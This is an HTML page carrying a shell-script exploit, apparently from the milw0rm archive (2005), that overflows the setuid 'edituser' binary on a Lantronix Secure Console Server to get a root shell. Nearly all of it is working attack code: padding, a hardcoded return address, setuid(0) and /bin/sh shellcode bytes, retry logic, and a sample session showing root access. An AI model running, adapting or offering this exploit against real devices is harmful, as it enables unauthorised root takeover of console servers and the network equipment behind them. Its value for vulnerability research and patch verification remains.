<html><head><title>Lantronix Secure Console Server (edituser) Local Root Exploit</title></head><pre> #!/bin/sh
 # Lantronix Secure Console Server edituser root exploit by
 # c0ntex - c0ntexb@gmail.com | c0ntex@open-security.org
 # Advisory @ http://www.open-security.org/advisories/11
 #
 # The Linux system supplied by Lantronix does not have gnu
 # C compiler, so the exploit is provided as a shell script
 # as such, you might need to change the address for
 #
 #[c0ntex@SCS1620 ~/exploit]$ sh edituserxp.sh
 #
 # **** *** *** *** *** *** *** *** ***
 #[-] Local root exploit for edituser using return-to-libc
 #[-] discovered and written by c0ntex | c0ntexb@gmail.com
 #Expect a root shell :-)  -&gt;  escape sequence is too long.
 #bash# id -a
 #uid=0(root) gid=0(root) groups=100(users),0(root),200(admin)
 #bash#
 #
 BUFFPAD=&quot;OPEN-SECURITY.ORG**OPEN-SECURITY.ORG**OPEN-SECURITY.ORG!&quot;
 NOPSLED=`perl -e 'print &quot;\x41&quot; x 1000'`
 RETADDR=`printf &quot;\x74\xc2\xfe\xbf&quot;`
 SETUID=`printf &quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80&quot;`
 SHELL=`printf &quot;\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;`
 STACKPAD=`perl -e 'print &quot;A&quot; x 65000'`
 VULNAP=/usr/local/bin/edituser
 VULNOP=&quot;-e&quot;

 export BUFFPAD NOPSLED RETADDR SETUID SHELL STACKPAD VULNAP VULNOP

 printf &quot;\n **** *** *** *** *** *** *** *** ***\n&quot;
 printf &quot;[-] Local root exploit for edituser\n&quot;
 printf &quot;[-] discovered and written by c0ntex\n&quot;

 if [ -f $VULNAPP ] ; then
       printf &quot;Expect a root shell :-)  -&gt;  &quot;; sleep 1
       $VULNAP $VULNOP $BUFFPAD$RETADDR$NOPSLED$SETUID$SHELL
       success=$?
       if [ $success -gt 0 ] ; then
               printf &quot;\nSeems something messed up, changing NOPBUF to 10000 and trying again!\n&quot;
               sleep 2
               unset NOPSLED
               NOPSLED=`perl -e 'print &quot;\x41&quot; x 10000'`
               printf &quot;Expect a root shell :-)  -&gt;  &quot;
               $VULNAP $VULNOP $BUFFPAD$RETADDR$NOPSLED$SETUID$SHELL
               success=$?
               if [ $success -gt 0 ] ; then
                       printf &quot;\nAgain it failed, sorry you are on your own now :(\n&quot;
               fi
       fi
 fi

# milw0rm.com [2005-08-05]</pre></html>